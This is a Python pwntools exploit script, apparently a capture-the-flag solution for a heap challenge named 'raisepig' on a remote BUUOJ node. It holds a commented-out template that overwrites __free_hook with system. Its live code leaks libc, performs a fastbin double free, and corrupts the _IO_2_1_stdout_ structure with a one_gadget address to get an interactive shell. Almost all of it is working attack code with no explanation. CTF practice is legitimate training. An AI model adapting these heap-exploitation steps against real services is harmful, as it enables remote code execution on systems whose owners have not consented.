# #!/usr/bin/env python2
# # -*- coding: utf-8 -*- #
# # @偏有宸机_Exploit-Template
# # Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# # Edit values:
# #      - RemPro()
# #           - elf_addr
# #           - pro_libc
# #           - enable_Onegadgets
# #      - exp()

# import os
# import sys
# import subprocess
# from pwn import *
# from one_gadget import generate_one_gadget 
# # context.terminal = ["tmux","new-window"]
# # context.terminal = ["tmux","splitw","-h"]
# context.arch = "amd64"
# # context.arch = "i386"
# # context.log_level = "debug"

# ### 远程本地连接
# def RemPro(ip='',port=''):
#     global sh,elf,libc,one_ggs
#     elf_addr = "./raisepig"                                   # 本地ELF
#     pro_libc = "libc-2.27_64.so"       # Libc文件
#     rem_libc = "libc-2.27_64.so"
#     if len(sys.argv) > 2 :
#         sh = remote(sys.argv[1],sys.argv[2])
#         try:
#             libc = ELF(rem_libc)
#             pro_libc = rem_libc
#         except:
#             log.info("No set Remote_libc...")
#             libc = ELF(pro_libc)
#     else:
#         libc = ELF(pro_libc)
#         try:
#             sh = remote(ip,port)
#             libc = ELF(rem_libc)
#             pro_libc = rem_libc
#             log.info("Remote Start...")
#         except:
#             sh = process(elf_addr)
#             log.info("Local Start...")
#     # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
#     # one_ggs = one_gadget(pro_libc)
#     elf = ELF(elf_addr)
#     return 1

# ### 调试用
# def debug(cmd=""):
#     if len(sys.argv) <= 2:
#         log.progress("Loading Debug....")
#         gdb.attach(sh,cmd)
# ### One_Gadget
# # def one_gadget(filename):
# #     log.progress("Leak One_Gadgets...")
# #     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
# #     return list(map(int,one_ggs))
# def one_gadget(libc_addr):
#     log.progress("Leak One_Gadgets...")
#     path_to_libc=libc_addr
#     gadget =[]
#     for offset in generate_one_gadget(path_to_libc):
#         gadget.append(int(offset))
#     return gadget
#     # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

# ru=lambda s:sh.recvuntil(s) 
# rv=lambda s:sh.recv(s)
# sd=lambda s:sh.send(s)
# sl=lambda s:sh.sendline(s)

# def malloc(size,content,type):
#     ru(":")
#     sl("1")
#     ru(":")
#     sl(str(size))
#     ru(":")
#     sd(content)
#     ru(":")
#     sl(type)

# def show():
#     ru(":")
#     sl("2")

# def delete(idx):
#     ru(":")
#     sl('3')
#     ru(":")
#     sl(str(idx))

# def clear_all():
#     ru(":")
#     sl("4")

# def exp():
#     malloc(0x28,'a','1')
#     malloc(0x28,'b','1')
#     malloc(0x80,"A","1")
#     malloc(0x18,'/bin/sh\x00','p')
#     for i in range(8):
#         delete(2)
#     delete(1)
#     delete(1)
#     malloc(0x18,'\x70','1')
#     show()
#     ru("Name[4] :")
#     main_arena=u64(rv(6).ljust(8,'\x00'))-304
#     info("main_arena: "+hex(main_arena))
#     libc_base=main_arena-0x3ebc40
#     info("libc_base: "+hex(libc_base))
#     malloc_hook=libc_base+libc.symbols['__malloc_hook']
#     info("malloc_hook: "+hex(malloc_hook))
#     free_hook=libc_base+libc.symbols['__free_hook']
#     info("free_hook: "+hex(free_hook))
#     system_addr=libc_base+libc.symbols['system']
#     info("system_addr: "+hex(system_addr))
#     realloc_addr=libc_base+libc.symbols['__realloc_hook']
#     ogg=libc_base+0x4f2c5
#     info("ogg: "+hex(ogg))
    
#     delete(1)
#     malloc(0x28,'/bin/sh\x00','1')

#     malloc(0x40,'b','1')
#     delete(6)
#     delete(6)

#     malloc(0x40,p64(free_hook),'1')
#     malloc(0x40,p64(free_hook),'1')
#     malloc(0x40,p64(system_addr),'1')

#     malloc(0x10,'/bin/sh\x00','/bin/sh\x00')
#     debug()
#     # malloc(0x40,p64(ogg),'1')
#     # delete(2)
#     # delete(2)
#     # delete(2)
#     # malloc(0x10,'/bin/sh\x00','p')
    
# if __name__=="__main__":
#     RemPro()
#     if len(sys.argv) > 3 :
#         eval(sys.argv[3])()
#     elif (len(sys.argv)>1 and len(sys.argv)<3):
#         eval(sys.argv[1])()
#     else:
#         exp()
#     sh.interactive()
    

from pwn import *


libc = ELF('./libc-2.27_64.so')
# env = {'LD_PRELOAD': './libc-64'}
malloc_hook = libc.symbols['__malloc_hook']
free_hook = libc.symbols['__free_hook']
env = {}
# p = process('./raisepig', env=env)
p = remote('node4.buuoj.cn', 28996)
context.log_level = 'debug'

def raise_pig(length, name, _type, shell=False):
    p.sendlineafter(':', '1')
    p.sendlineafter(':', str(length))
    p.recvuntil(':')
    p.send(name)
    if not shell:
        p.sendlineafter(':', _type)

def visit():
    p.sendlineafter(':', '2')

def eat(idx):
    p.recvuntil('choice :')
    p.sendline('3')
    p.recvuntil('eat:')
    p.sendline(str(idx))

raise_pig(0x80, 'b'*0x7f, 'B'*23)
raise_pig(0x20, 'a'*0xf, 'A'*23)
raise_pig(0x10, 'a'*0xf, 'A'*23)
raise_pig(0x60, 'c'*0x5f, 'C'*23)
raise_pig(0x60, 'c'*0x5f, 'C'*23)
eat(0)
eat(1)
# gdb.attach(p, 'tracemalloc on')
raise_pig(0x80, 'b'*8, 'B'*9)
visit()
p.recvuntil('b'*8)
leak_libc = u64(p.recv(6) + '\x00\x00')
p.info('leak_libc: %x' % leak_libc)
libc_start = leak_libc -0x3c4b78
malloc_hook = libc_start + malloc_hook 
free_hook = libc_start + free_hook
one_gadget = libc_start + 0x4526a
relloc_hook = libc_start + libc.symbols['__libc_realloc']
p.info('libc_start: %x' % libc_start)
p.info('malloc_hook: %x' % malloc_hook)
p.info('free_hook: %x' % free_hook)
IO_2_1_stdout = libc_start + 0x3c5620
p.info('IO_2_1_stdout: %x' % IO_2_1_stdout)

eat(3)
eat(4)
eat(3)
raise_pig(0x60, p64(IO_2_1_stdout+0x9d), 'C'*23)
raise_pig(0x60, 'junk', 'C'*23)
raise_pig(0x60, 'junk', 'C'*23)

payload = "\x00"*3
payload += 2*p64(0)
payload += p64(0xffffffff)
payload += p64(0)
payload += p64(one_gadget)
payload += p64(IO_2_1_stdout+0x98)

raise_pig(0x60, payload, 'C'*23, True)


p.interactive()